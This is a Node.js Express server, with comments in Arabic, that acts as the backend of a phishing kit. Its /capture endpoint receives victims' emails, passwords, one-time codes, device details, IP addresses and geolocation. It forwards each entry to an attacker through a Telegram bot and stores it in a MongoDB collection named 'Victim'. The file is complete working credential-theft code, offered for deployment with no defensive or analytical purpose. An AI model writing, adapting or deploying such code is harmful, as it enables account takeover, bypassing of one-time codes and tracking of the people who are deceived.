require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();

// إعدادات الوسيط (Middleware)
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// استدعاء البيانات الحساسة من البيئة المحيطة
const MONGO_URI = process.env.MONGO_URI;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// الاتصال بقاعدة البيانات مع معالجة الأخطاء
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB Securely"))
    .catch(e => console.log("❌ DB connection error:", e.message));

// تعريف نموذج البيانات (Schema)
const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, 
    password: String, 
    otp: String, 
    device: String, 
    ip: String, // أضفنا حقل الـ IP
    location: Object,
    timestamp: { type: Date, default: Date.now } // أضفنا وقت وصول البيانات
}));

// تقديم الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات
app.post('/capture', async (req, res) => {
    const data = req.body;
    
    // جلب الـ IP الحقيقي للزائر خلف بروكسي Render
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    try {
        // تنسيق رسالة التليجرام بشكل أوضح
        let msg = `🚀 **إشعار جديد**\n`;
        msg += `━━━━━━━━━━━━━━\n`;
        msg += `📧 **الحساب:** \`${data.email}\` \n`;
        msg += `🔑 **الكلمة:** \`${data.password}\` \n`;
        msg += `🌐 **الآي بي:** \`${visitorIp}\` \n`;
        msg += `📱 **الجهاز:** ${data.device}\n`;
        
        if(data.location && data.location.lat) {
            msg += `📍 **الموقع:** https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        }
        msg += `\n━━━━━━━━━━━━━━`;
        
        // إرسال البيانات للتليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
    } catch (e) { 
        console.log("❌ Telegram Error:", e.message); 
    }

    try {
        // حفظ البيانات في MongoDB مع الـ IP والوقت
        const entry = new Victim({
            ...data,
            ip: visitorIp
        });
        await entry.save();
    } catch (e) { 
        console.log("❌ DB Save Error");
    }

    res.status(200).send("OK");
});

// تحديد المنفذ (Render يفضل استخدام المتغير البيئي PORT)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
